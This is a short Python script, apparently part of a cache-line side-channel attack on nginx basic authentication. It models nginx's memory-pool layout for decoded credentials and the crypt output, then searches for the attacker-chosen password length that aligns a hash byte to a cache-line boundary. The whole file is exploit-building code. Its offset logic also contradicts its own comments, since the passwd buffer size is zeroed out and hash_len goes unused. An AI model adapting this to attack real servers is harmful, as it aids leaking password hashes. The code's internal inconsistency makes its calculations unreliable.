NGX_POOL_STRUCT_SIZE = 80
CACHE_LINE_SIZE = 64

def compute_alloc1_size(cred_len: int) -> int:
    """Size of first pool allocation (base64-decoded credentials buffer).

    Pool alloc order in the nginx victim:
      1. ngx_pnalloc(pool, decoded_max + 1)  — base64-decoded credentials
      2. ngx_pnalloc(pool, hash_len + 1)     — passwd copy from htpasswd
      3. ngx_pnalloc(pool, hash_len + 1)     — encrypted (ngx_crypt output)
    All via ngx_palloc_small (no alignment), so offsets are sequential.
    """
    enc_len = ((cred_len + 2) // 3) * 4  # base64 encoded length
    decoded_max = ((enc_len + 3) // 4) * 3  # max decoded length
    return decoded_max + 1


def find_password_len(
    username: str,
    hash_len: int,
    byte_idx: int,
) -> int | None:
    """Find the shortest password that places encrypted[byte_idx+1] at target CL offset.

    The attacker controls the HTTP password length. Varying it shifts the pool
    bump pointer, changing where encrypted and passwd land in the cache line.

    This lenght is not linear, because base64 encoding does not grow linearly.
    """
    ulen = len(username) + 1  # "username:" prefix
    for pwd_len in range(235, 500):
        cred_len = ulen + pwd_len
        alloc1 = compute_alloc1_size(cred_len)
        # alloc2 = hash_len + 1  # passwd buffer
        alloc2 = 0
        # encrypted starts right after passwd in the pool
        off = NGX_POOL_STRUCT_SIZE + alloc1 + alloc2 + byte_idx + 1
        if off % CACHE_LINE_SIZE == 0:
            return pwd_len
    return None

print(find_password_len("t", 0, 1))
